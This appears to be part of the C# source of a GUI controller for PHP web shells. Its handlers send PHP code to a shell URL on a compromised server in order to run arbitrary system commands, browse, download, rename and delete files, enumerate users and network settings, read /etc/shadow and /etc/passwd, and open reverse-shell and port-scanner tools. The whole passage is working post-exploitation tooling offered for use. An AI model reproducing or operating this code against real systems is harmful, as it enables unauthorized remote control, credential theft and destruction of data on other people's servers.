            string result = await ExecutePHPCode(shellUrl, directoryContentsPHPCode, encryptResponse, ResponseEncryptionMode);

            Shells[shellUrl].Files.Nodes.Clear();

            if (SelectedShellUrl == shellUrl) {
                treeViewFileBrowser.Nodes.Clear();
                treeViewFileBrowser.Refresh();

                txtBoxFileBrowserPath.Text = lastPathRemoved;

                if (!string.IsNullOrEmpty(result)) {
                    FileBrowserRender(result, shellUrl);
                }
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void fileBrowserTreeView_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            if (ValidTarget() == false) {
                return;
            }

            string shellUrl = SelectedShellUrl;
            string phpVersion = Shells[shellUrl].PHP_VERSION;
            bool encryptResponse = Shells[shellUrl].ResponseEncryption;
            int ResponseEncryptionMode = Shells[shellUrl].ResponseEncryptionMode;

            TreeNode tn = treeViewFileBrowser.SelectedNode;

            if (tn != null && tn.Nodes.Count == 0) {
                string path = tn.FullPath.Replace('\\', '/');

                if (path.Contains("..")) {
                    FilebrowserGoBack();
                } else {
                    string fullPath = string.Empty;
                    if (Shells[shellUrl].IsWindows) {
                        fullPath = path;
                    } else {
                        fullPath = txtBoxFileBrowserPath.Text + "/" + path;
                    }

                    string directoryContentsPHPCode = PhpBuilder.DirectoryEnumerationCode(fullPath, phpVersion, encryptResponse);
                    string result = await ExecutePHPCode(shellUrl, directoryContentsPHPCode, encryptResponse, ResponseEncryptionMode);

                    if (string.IsNullOrEmpty(result) == false) {
                        FileBrowserRender(result, shellUrl, tn);
                    }
                }
            }
        }

        /// <summary>
        /// Override Prevents the filebrowser icon from being changed when selected
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void treeView1_AfterSelect(object sender, TreeViewEventArgs e)
        {
            treeViewFileBrowser.SelectedImageIndex = e.Node.ImageIndex;
        }

        /// <summary>
        /// Hard re-fresh the filebrowser and start over at the (root) directory.
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void btnFileBrowserRefresh_Click(object sender, EventArgs e)
        {
            if (ValidTarget() == false) {
                return;
            }

            if (treeViewFileBrowser.Nodes != null
             && treeViewFileBrowser.Nodes.Count > 0) {
                if (Shells[SelectedShellUrl].Files != null) {
                    Shells[SelectedShellUrl].Files.Nodes.Clear();
                }
                treeViewFileBrowser.Nodes.Clear();
                treeViewFileBrowser.Refresh();
            }
            StartFileBrowser();
        }

        /// <summary>
        /// Updates selected node on right click to ensure that we have the correct node selected whenever 
        /// we preform context menu stip events on the filebrowser
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void treeView1_NodeMouseClick(object sender, TreeNodeMouseClickEventArgs e)
        {
            if (e.Button == MouseButtons.Right && e.Node != null) {
                treeViewFileBrowser.SelectedNode = e.Node;
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <returns></returns>
        private string fileBrowserGetFileName()
        {
            return treeViewFileBrowser.SelectedNode.FullPath.Replace('\\', '/');
        }

        /// <summary>
        /// 
        /// </summary>
        /// <returns></returns>
        private string fileBrowserGetFileNameAndPath()
        {
            string fileName = treeViewFileBrowser.SelectedNode.FullPath.Replace('\\', '/');
            return txtBoxFileBrowserPath.Text.TrimEnd('/', '\\') + "/" + fileName;
        }

        /// <summary>
        //
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void readFileToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            string shellUrl = SelectedShellUrl;
            bool encrypt = Shells[shellUrl].ResponseEncryption;
            int ResponseEncryptionMode = Shells[shellUrl].ResponseEncryptionMode;

            string name = fileBrowserGetFileNameAndPath();
            string phpCode = PhpBuilder.ReadFileToBase64(name, encrypt);
        
            ExecutePHPCodeDisplayInRichTextBox(shellUrl, phpCode, "Viewing File -" + name, encrypt, ResponseEncryptionMode, true);
        }

        /// <summary>
        /// Renames a file using the name input from the prompt
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void renameFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (ValidTarget() == false) {
                return;
            }

            string shellUrl = SelectedShellUrl;
            string fileName = fileBrowserGetFileNameAndPath();

            string newFileName = GuiHelper.RenameFileDialog(fileName, "Renaming File");

            if (!string.IsNullOrEmpty(newFileName)) {
                string newFile = txtBoxFileBrowserPath.Text + '/' + newFileName;
                string phpCode = "@rename('" + fileName + "', '" + newFile + "');";

                await WebHelper.ExecuteRemotePHP(shellUrl, phpCode).ConfigureAwait(false);
            }
        }

        /// <summary>
        /// Deletes a file after displaying a warning prompt
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void deleteFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (ValidTarget() == false) {
                return;
            }

            string shellUrl = SelectedShellUrl;
            string path = fileBrowserGetFileNameAndPath();

            DialogResult dialogResult = MessageBox.Show("Are you sure you want to delete \r\n(" + path + ")", 
                                                        "Delete File Operation", 
                                                         MessageBoxButtons.YesNo);

            if (dialogResult == DialogResult.Yes) {
                string phpCode = "@unlink('" + path + "');";
                await WebHelper.ExecuteRemotePHP(shellUrl, phpCode).ConfigureAwait(false);
            }
        }

        /// <summary>
        /// Creates a copy of the selected file using the name from the prompt
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void copyFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (ValidTarget() == false) {
                return;
            }

            string shellUrl = SelectedShellUrl;
            string fileName = fileBrowserGetFileNameAndPath();
            string newFileName = GuiHelper.RenameFileDialog(fileName, "Copying File");

            if (!string.IsNullOrEmpty(newFileName)) {
                string phpCode = "@copy('" + fileName + "', '" + txtBoxFileBrowserPath.Text + "/" + newFileName + "');";
                await WebHelper.ExecuteRemotePHP(shellUrl, phpCode).ConfigureAwait(false);
            }
        }

        /// <summary>
        /// Scrolls to the end of the Console Output Richtext box on update
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void richTextBoxConsoleOutput_TextChanged(object sender, EventArgs e)
        {
            richTextBoxConsoleOutput.SelectionStart = richTextBoxConsoleOutput.Text.Length;
            richTextBoxConsoleOutput.ScrollToCaret();
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void proxySettingsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ProxyOptions proxyOptions = ProxyOptions.getInstance();
            proxyOptions.ShowDialog();
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void copyShellURLToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Clipboard.SetText(SelectedShellUrl);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void btnConsoleGoClick_Click(object sender, EventArgs e)
        {
            if (ValidTarget() == false) {
                return;
            }

            if (string.IsNullOrEmpty(textBoxConsoleInput.Text)) {
                return;
            }

            string shellUrl = SelectedShellUrl;
            bool encryptResponse = Shells[shellUrl].ResponseEncryption;
            int ResponseEncryptionMode = Shells[shellUrl].ResponseEncryptionMode;

            string cmd = textBoxConsoleInput.Text;
            string phpCode = PhpBuilder.ExecuteSystemCode(textBoxConsoleInput.Text, encryptResponse);

            string result = await ExecutePHPCode(shellUrl, phpCode, encryptResponse, ResponseEncryptionMode);

            if (string.IsNullOrEmpty(result) == false) {
                richTextBoxConsoleOutput.Text += "$ " + cmd + "\r\n" + result + "\r\n";
                textBoxConsoleInput.Text = string.Empty;
            } else {
                richTextBoxConsoleOutput.Text += "$ " + cmd + "\r\nNo Data Returned\r\n";
                textBoxConsoleInput.Text = string.Empty;
            }

            consoleTextboxAutoComplete.Add(cmd);

        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void downloadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (ValidTarget() == false) {
                return;
            }

            string shellUrl = SelectedShellUrl;
            string fileName = fileBrowserGetFileName();
            bool encryptResponse = Shells[shellUrl].ResponseEncryption;
            int ResponseEncryptionMode = Shells[shellUrl].ResponseEncryptionMode;

            SaveFileDialog downloadFileDialog = new SaveFileDialog {
                RestoreDirectory = true
            };

            if (downloadFileDialog.ShowDialog() == DialogResult.OK) {
                if (!string.IsNullOrEmpty(downloadFileDialog.FileName)) {
                    string phpCode = PhpBuilder.ReadFileToBase64(fileName, encryptResponse);
                    string result = await ExecutePHPCode(shellUrl, phpCode, encryptResponse, ResponseEncryptionMode).ConfigureAwait(false);
                    if (string.IsNullOrEmpty(result) == false) {
                        byte[] fileBytes = Helper.DecodeBase64(result);
                        File.WriteAllBytes(downloadFileDialog.FileName, fileBytes);
                    }
                }
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void portScannerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            PortScanner ps = new PortScanner(SelectedShellUrl);
            ps.ShowDialog();
        }

        private void portScannerToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            DistributedPortScanner ds = new DistributedPortScanner();
            ds.ShowDialog();
        }

        private void textBoxMaxCommentLength_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (!char.IsControl(e.KeyChar) && !char.IsDigit(e.KeyChar)) {
                e.Handled = true;
            }
        }

        private void toolStripMenuItemReverseShell_Click(object sender, EventArgs e)
        {
            ReverseShell reverseShellForm = new ReverseShell(SelectedShellUrl);
            reverseShellForm.ShowDialog();
        }

        #endregion

        #region OS_COMMANDS

        /// <summary>
        /// Shows process list inside of a read-only richtext editor
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void psAuxToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string shellUrl = SelectedShellUrl;
            bool isWin = Shells[shellUrl].IsWindows;
            bool encrypt = Shells[shellUrl].ResponseEncryption;
            int ResponseEncryptionMode = Shells[shellUrl].ResponseEncryptionMode;

            string cmd = PhpBuilder.TaskListFunction(isWin);
            string phpCode = PhpBuilder.ExecuteSystemCode(cmd, encrypt);

            ExecutePHPCodeDisplayInRichTextBox(shellUrl, phpCode, cmd, encrypt, ResponseEncryptionMode);
        }
       
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void windowsNetuserMenuItem_Click(object sender, EventArgs e)
        {
            string shellUrl = SelectedShellUrl;
            string cmd = PhpBuilder.windowsOS_NetUser;
            bool encrypt = Shells[shellUrl].ResponseEncryption;
            string phpCode = PhpBuilder.ExecuteSystemCode(cmd, encrypt);
            int ResponseEncryptionMode = Shells[shellUrl].ResponseEncryptionMode;

            ExecutePHPCodeDisplayInRichTextBox(shellUrl, phpCode, cmd, encrypt, ResponseEncryptionMode);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void windowsNetaccountsMenuItem_Click(object sender, EventArgs e)
        {
            string shellUrl = SelectedShellUrl;
            string cmd = PhpBuilder.windowsOS_NetAccounts;
            bool encrypt = Shells[shellUrl].ResponseEncryption;
            string phpCode = PhpBuilder.ExecuteSystemCode(cmd, encrypt);
            int ResponseEncryptionMode = Shells[shellUrl].ResponseEncryptionMode;

            ExecutePHPCodeDisplayInRichTextBox(shellUrl, phpCode, cmd, encrypt, ResponseEncryptionMode);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void windowsIpconfigMenuItem_Click(object sender, EventArgs e)
        {
            string shellUrl = SelectedShellUrl;
            string cmd = PhpBuilder.windowsOS_Ipconfig;
            bool encrypt = Shells[shellUrl].ResponseEncryption;
            string phpCode = PhpBuilder.ExecuteSystemCode(cmd, encrypt);
            int ResponseEncryptionMode = Shells[shellUrl].ResponseEncryptionMode;

            ExecutePHPCodeDisplayInRichTextBox(shellUrl, phpCode, cmd, encrypt, ResponseEncryptionMode);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void windowsVerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string shellUrl = SelectedShellUrl;
            string cmd = PhpBuilder.windowsOS_Ver;
            bool encrypt = Shells[shellUrl].ResponseEncryption;
            string phpCode = PhpBuilder.ExecuteSystemCode(cmd, encrypt);
            int ResponseEncryptionMode = Shells[shellUrl].ResponseEncryptionMode;

            ExecutePHPCodeDisplayInRichTextBox(shellUrl, phpCode, cmd, encrypt, ResponseEncryptionMode);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void whoamiToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string shellUrl = SelectedShellUrl;
            ShellInfo shell = Shells[shellUrl];

            string cmd = PhpBuilder.posixOS_Whoami;
            string phpCode = PhpBuilder.ExecuteSystemCode(cmd, shell.ResponseEncryption);

            ExecutePHPCodeDisplayInRichTextBox(shellUrl, phpCode, cmd, shell.ResponseEncryption, shell.ResponseEncryptionMode);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void linuxIfconfigMenuItem_Click(object sender, EventArgs e)
        {
            string shellUrl = SelectedShellUrl;
            string cmd = PhpBuilder.linuxOS_Ifconfig;
            bool encrypt = Shells[shellUrl].ResponseEncryption;
            int ResponseEncryptionMode = Shells[shellUrl].ResponseEncryptionMode;

            string phpCode = PhpBuilder.ExecuteSystemCode(cmd, encrypt);

            ExecutePHPCodeDisplayInRichTextBox(shellUrl, phpCode, cmd, encrypt, ResponseEncryptionMode);
        }

        #endregion

        #region READ_COMMON_FILES
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void windowsTargetsMenuItem_Click(object sender, EventArgs e)
        {
            string shellUrl = SelectedShellUrl;
            bool encryptResponse = Shells[shellUrl].ResponseEncryption;
            int ResponseEncryptionMode = Shells[shellUrl].ResponseEncryptionMode;

            string phpCode = PhpBuilder.ReadFileToBase64(PhpBuilder.windowsFS_hostTargets, encryptResponse);

            ExecutePHPCodeDisplayInRichTextBox(shellUrl, phpCode, PhpBuilder.windowsFS_hostTargets, encryptResponse, ResponseEncryptionMode, true);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void linuxInterfacesMenuItem_Click(object sender, EventArgs e)
        {
            string shellUrl = SelectedShellUrl;
            bool encryptResponse = Shells[shellUrl].ResponseEncryption;
            int ResponseEncryptionMode = Shells[shellUrl].ResponseEncryptionMode;

            string phpCode = PhpBuilder.ReadFileToBase64(PhpBuilder.linuxFS_NetworkInterfaces, encryptResponse);

            ExecutePHPCodeDisplayInRichTextBox(shellUrl, phpCode, PhpBuilder.linuxFS_NetworkInterfaces, encryptResponse, ResponseEncryptionMode, true);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void linusVersionMenuItem_Click(object sender, EventArgs e)
        {
            string shellUrl = SelectedShellUrl;
            bool encryptResponse = Shells[shellUrl].ResponseEncryption;
            int ResponseEncryptionMode = Shells[shellUrl].ResponseEncryptionMode;

            string phpCode = PhpBuilder.ReadFileToBase64(PhpBuilder.linuxFS_ProcVersion, encryptResponse);

            ExecutePHPCodeDisplayInRichTextBox(shellUrl, phpCode, PhpBuilder.linuxFS_ProcVersion, encryptResponse, ResponseEncryptionMode, true);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void linuxhostsMenuItem_Click(object sender, EventArgs e)
        {
            string shellUrl = SelectedShellUrl;
            bool encryptResponse = Shells[shellUrl].ResponseEncryption;
            int ResponseEncryptionMode = Shells[shellUrl].ResponseEncryptionMode;

            string phpCode = PhpBuilder.ReadFileToBase64(PhpBuilder.linuxFS_hostTargetsFile, encryptResponse);

            ExecutePHPCodeDisplayInRichTextBox(shellUrl, phpCode, PhpBuilder.linuxFS_hostTargetsFile, encryptResponse, ResponseEncryptionMode, true);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void linuxIssuenetMenuItem_Click(object sender, EventArgs e)
        {
            string shellUrl = SelectedShellUrl;
            bool encryptResponse = Shells[shellUrl].ResponseEncryption;
            int ResponseEncryptionMode = Shells[shellUrl].ResponseEncryptionMode;

            string phpCode = PhpBuilder.ReadFileToBase64(PhpBuilder.linuxFS_IssueFile, encryptResponse);

            ExecutePHPCodeDisplayInRichTextBox(shellUrl, phpCode, PhpBuilder.linuxFS_IssueFile, encryptResponse, ResponseEncryptionMode, true);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void shadowToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string shellUrl = SelectedShellUrl;
            bool encryptResponse = Shells[shellUrl].ResponseEncryption;
            int ResponseEncryptionMode = Shells[shellUrl].ResponseEncryptionMode;

            string phpCode = PhpBuilder.ReadFileToBase64(PhpBuilder.linuxFS_ShadowFile, encryptResponse);

            ExecutePHPCodeDisplayInRichTextBox(shellUrl, phpCode, PhpBuilder.linuxFS_ShadowFile, encryptResponse, ResponseEncryptionMode, true);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void passwdToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string shellUrl = SelectedShellUrl;
            bool encryptResponse = Shells[shellUrl].ResponseEncryption;
            string phpCode = PhpBuilder.ReadFileToBase64(PhpBuilder.linuxFS_PasswdFile, Shells[shellUrl].ResponseEncryption);
            int ResponseEncryptionMode = Shells[shellUrl].ResponseEncryptionMode;

            ExecutePHPCodeDisplayInRichTextBox(shellUrl, phpCode, PhpBuilder.linuxFS_PasswdFile, encryptResponse, ResponseEncryptionMode, true);
        }

        #endregion

        private void optionsToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            Options optionsForm = new Options();
            optionsForm.ShowDialog();
        }
    }
}
